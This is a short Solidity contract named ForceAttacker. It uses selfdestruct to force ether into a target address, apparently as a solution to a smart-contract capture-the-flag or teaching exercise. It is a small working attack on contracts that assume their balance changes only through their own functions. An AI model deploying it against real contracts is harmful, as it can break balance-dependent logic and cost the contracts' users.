// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttacker {
    function attack(address payable target) external {
        selfdestruct(target);
    }

    receive() external payable {}
}
